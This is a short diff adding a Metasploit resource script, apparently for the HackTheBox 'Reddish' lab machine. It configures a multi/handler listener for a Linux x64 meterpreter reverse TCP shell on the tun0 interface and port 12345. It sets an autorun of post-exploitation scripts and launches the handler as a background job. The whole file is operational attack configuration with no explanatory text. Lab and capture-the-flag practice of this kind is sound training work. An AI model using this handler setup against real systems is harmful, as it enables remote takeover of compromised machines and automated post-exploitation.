@@ -1,0 +1,7 @@
+use multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set lhost tun0
+set lport 12345
+set autorunscript multi_console_command -r /root/htb/reddish/post-exploit-scripts.rc 
+exploit -j 
+
